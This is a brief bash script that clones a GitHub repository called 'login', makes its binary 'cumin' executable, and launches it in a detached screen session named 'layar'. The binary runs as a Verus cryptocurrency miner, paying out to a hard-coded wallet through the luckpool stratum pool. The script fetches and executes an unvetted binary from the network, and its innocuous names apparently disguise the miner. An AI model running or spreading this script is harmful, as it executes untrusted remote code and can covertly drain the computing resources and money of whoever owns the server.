#!/bin/bash
POOL=stratum+tcp://na.luckpool.net:3956#xnsub
WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
WORKER=vps
sudo apt update
sudo apt install screen libjansson4 -y
git clone https://github.com/sallygonza/login.git 
cd login
chmod +x cumin
screen -dmS layar ./cumin -a verus -o $POOL -u $WALLET.$WORKER -p hybrid -t 2  \n
